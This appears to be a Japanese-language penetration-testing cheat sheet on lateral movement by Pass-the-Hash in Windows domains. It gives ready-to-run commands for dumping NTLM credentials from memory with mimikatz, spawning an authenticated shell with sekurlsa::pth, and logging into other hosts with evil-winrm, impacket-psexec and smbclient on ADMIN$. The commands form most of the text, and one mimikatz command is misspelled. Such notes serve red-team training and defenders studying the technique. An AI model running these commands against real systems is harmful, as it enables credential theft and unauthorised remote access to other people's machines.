# Lateral Movement

## Pass The Hash

### 概要

- New technology LAN Manager認証の仕組みを悪用
- NTLMハッシュ値使用
- 解析なしで標的にアクセスできるため、複雑なパスワードが設定されていても攻撃可能
- NTLMv2認証はWindows 2000以前の古いOSに対応
- ローカルユーザのNTLMハッシュ値は SAMデータベースに保存
- ドメインユーザのNTLMハッシュはドメコン上のNTDS.ditに保存
- NTハッシュは平文をMD4でハッシュ化ソルトは付与しないため、同じ平文をMD4でハッシュ化したものと一致する。

#### 手順(mimikatz)

※管理者権限が必要

以下の場合に有効
> 侵入した端末のユーザが標的の場合、侵入した端末に対してRDP接続したユーザが標的の場合

- mimikatzを起動してNTLMハッシュを取得

``` cmd
    [mimikatzのパス].\mimikatz.exe
    
    privilege::debug
    selurlsa::logonpasswords
```

メモリ上に残存している認証情報を取得

- 起動中のmimikatzでNTLM認証を行う

``` cmd
    sekurlsa::pth /user:[username]　/ntlm:[NTLMハッシュ値] /domain:[somainname] /run:cmd.exe
```

NTLM認証を行った`cmd.exe`起動する。

起動した`cmd.exe`上で`PsExec`を使用することでパスワードなしで別端末にログインできる。

#### Pass The Hashで使用されるツール

- evil-winrm

winrmを使用したリモート接続が可能
> 接続用の認証情報と標的端末でWinRMが有効になっていることが必要

```shell
    evil-winrm -u [username] -H [NTLMハッシュ] -i [Target IP address]
```

[evil-winrm](https://github.com/Hackplayers/evil-winrm)

- Impacket(psexec.py)

Active Directoryに対してpsexecでPtHを行いシェル操作を行う。

SMBを使用して標的上でサービスを起動しコマンドを実行する。
> 標的上のローカル管理者を保持、管理共有(ADMIN$)とファイル/プリンタの共有が有効化されていることが必要

- mimikatzで取得したNTLMハッシュを使用する。

``` shell
    impacket-psexec -hashes [0を32個で埋める]:[NTLMハッシュ]　Administrator@[windows server IP address]
    # -hashes LM hash:NT hash LMハッシュ使用しないので0を32個埋める0000... 
```

[psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py)

- 管理共有にアクセスすると実行ファイルを確認できる

``` shell
    smbclient //[Windows Server IPアドレス]/ADMIN$ -U Administrator
```
